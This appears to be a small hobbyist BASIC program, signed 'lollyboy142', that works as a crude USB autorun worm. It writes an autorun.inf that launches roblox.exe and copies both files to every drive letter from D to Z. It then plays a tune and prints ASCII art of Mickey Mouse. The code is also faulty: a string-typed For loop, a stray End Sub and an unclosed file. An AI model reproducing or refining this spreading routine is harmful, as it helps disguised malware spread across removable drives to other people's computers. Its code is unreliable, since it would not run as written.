On Error GoTo doesnotexist
ChDir "C:\roblox"
Call usb
Call playmusic
End
doesnotexist:
Call MySub
Resume Next
End
Sub MySub
    Cls ' Clear screen
    MkDir "C:\roblox"
    Open "c:\roblox\autorun.inf" For Output As #1 ' Open the file for output
    Print #1, "[AutoRun]" ' Send characters to the file
    Print #1, "OPEN=roblox.exe" ' Send characters to the file
    Shell "copy roblox.exe c:\roblox"

End Sub

Sub usb
    Dim drive As String
    For drive = "D" To "Z" ' Check all possible drive letters
        If Dir(drive & ":\", vbDirectory) <> "" Then
            Shell "copy roblox.exe " & drive & ":\"
            Shell "copy c:\roblox\autorun.inf " & drive & ":\"
        End If
    Next drive
End Sub

End Sub
Sub playmusic
    Play "mb"
    Play "o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c#"
    Width 80, 25 ' works in QuickBasic, QBASIC, and QB64.
    Cls
    Color 4
    Print "...--@@+++=:...............@.:=+++-............."
    Print ".-#@@@@@%%#-............=%@@@@%%#*:.."
    Print "-%@@@@@@@@@@*..........#@@@@@@@@@%#-..."
    Print "@@@@@@@@@@@@@:........-@@@@@@@@@@@%#:.."
    Print ":@@@@@@@@@@@@@-........+@@@@@@@@@@@@@:"
    Print "*@@@@@@@@@@@@#--*@@*--#@@@@@@@@@@@@+.."
    Print ":*@@@@@@@@@%=----------+@@@@@@@@@@*:..."
    Print ":*@@@@@@#-------------=@@@@@@@#:....."
    Print ".....-@@*---****-=+--*-+----*@@-..."
    Print ".....@@%=---****=.:=:***..=---+@@....."
    Print "....=@@@+----:***=:*:***---+@@@:...."
    Print "....+@@@*---+*%-*@-----#.---..@..."
    Print "....:@+:----=-=++=------=%@..@@@..."
    Print ".....@--------@@@@%+------:-...@.."
    Print "......@=---=----===---------:.@..."
    Print ".......@.=---===------=-=---:@.."
    Print "........@:---#%%%%%%=---:...@...."
    Print "..........@..-==++=-:.....@...."
    Print ".............@@...@@.:=@@-:...."
    Print "That is Mickey Mouse... This artwork is maybe"
    Print "the greatest achievement of my life. Goodbye."
    Print "Best Regards,"
    Print "mr.loser AKA lollyboy142"
End Sub






